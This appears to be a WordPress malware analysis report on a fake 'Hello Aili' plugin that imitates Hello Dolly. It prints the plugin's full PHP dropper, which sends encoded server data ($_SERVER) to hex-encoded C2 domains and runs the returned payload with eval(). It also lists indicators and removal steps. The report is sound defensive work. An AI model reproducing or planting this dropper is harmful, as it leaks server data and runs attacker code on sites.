---
title: 'Hello Aili Plugin Spam Injector'
slug: 'hello-aili-plugin-spam-injector'
reportDate: '2026-01-27'
threatType: 'Spam Injection'
severity: 'High'
fileHash: 'fake-hellos-seo-spam-injector'
detectedPaths: ['hello.php']
screenshots:
  [
    '/images/wordpress-threats/fake-hellos-seo-spam-injector_evidence-1.png',
    '/images/wordpress-threats/fake-hellos-seo-spam-injector_evidence-2.png',
  ]
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'The site generates thousands of spam pages, negatively affecting SEO and potentially increasing server load. The site becomes part of a broader spam network.'
seenOn: "Observed in the '/wp-content/plugins/hellos/' directory."
behavior: 'The plugin disguises itself as a legitimate WP plugin, uses RCE to download and execute code, dynamically injects spam content into the site routing.'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: '1'
---

## Technical Analysis

The 'Hello Aili' plugin masquerades as the legitimate Hello Dolly plugin but contains malicious code that executes on both the admin and frontend. The function 'open_hello()' sends the server's data to a list of associated domains, from which it downloads and executes a PHP payload using 'eval()', resulting in the dynamic generation of spam pages.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. Step 1: Plugin 'Hello Aili' is installed in the '/wp-content/plugins/hellos/' directory.
2. Step 2: The 'open_hello()' function is triggered through 'admin_init' or directly when the site is loaded.
3. Step 3: Server environment data is encoded to a 'User-Agent' header and sent to predefined domains.
4. Step 4: A PHP payload is retrieved from these domains and executed via 'eval()', generating SEO spam pages.

## Code Signature(s)

### FILE: `hello.php`

```php
<?php
/**
 * @package Hello_Joy
 * @version 1.7.2
 */
/*
Plugin Name: Hello Aili
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

add_action('admin_init', "open_hello");

if (!is_admin()) {
    open_hello();
}

function open_hello()
{
    $args = array(
        'timeout' => 15,
        'headers' => array(
            "User-Agent" => json_encode($_SERVER),
        ),
    );
    $ids =array(
        '76312e73616c65736275792e7275',
        '76312e64696373616c652e7275',
        '76312e61616263642e7275',
        '616b627676696473652e73686f70'
    );
    foreach ($ids as $hex) {
        $id = hex2bin($hex);
        $response = wp_remote_get("http://" . $id , $args);
        if (!is_wp_error($response) && 200 === wp_remote_retrieve_response_code($response)) {
            return eval($response['body']);
        }
    }
}

```

### 📂 File System Indicators

- **Malicious Path:** `/wp-content/plugins/hellos/`
- **Malicious File:** `/wp-content/plugins/hellos/hellos.php` (Masquerading as "Hello Dolly")
- **Fake Metadata:** Plugin Name header reading `Hello Aili` but using "Matt Mullenweg" as the author.

### 🌐 Network Indicators (C2 Domains)

_Block these domains in your firewall or hosts file:_

- `v1.salesbuy.ru`
- `v1.dicsale.ru`
- `v1.aabcd.ru`
- `akbvvidsse.shop`

### 🧬 Code Signatures (Forensic Search)

_Search your codebase or database for these specific strings:_

**1. Malicious Function Name:**
`function open_hello()`

**2. Hex-Encoded C2 Signatures (High Fidelity):**
_Search for these strings to find the dropper even if they change the domain names:_

- `76312e73616c65736275792e7275` (Decodes to v1.salesbuy.ru)
- `76312e64696373616c652e7275` (Decodes to v1.dicsale.ru)
- `616b627676696473652e73686f70` (Decodes to akbvvidsse.shop)

**3. Spam URL Pattern:**

- Query parameters matching `?a=[0-9]+` (e.g., `?a=117728283373`)
- Query parameters matching `?r=[0-9]+`

## Removal Protocol

1. Step 1: Delete the '/wp-content/plugins/hellos/' directory.
1. Step 2: Purge the website cache to clear any residual spam content.
1. Step 3: Conduct a full database scan for persistent malicious hooks or changes.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
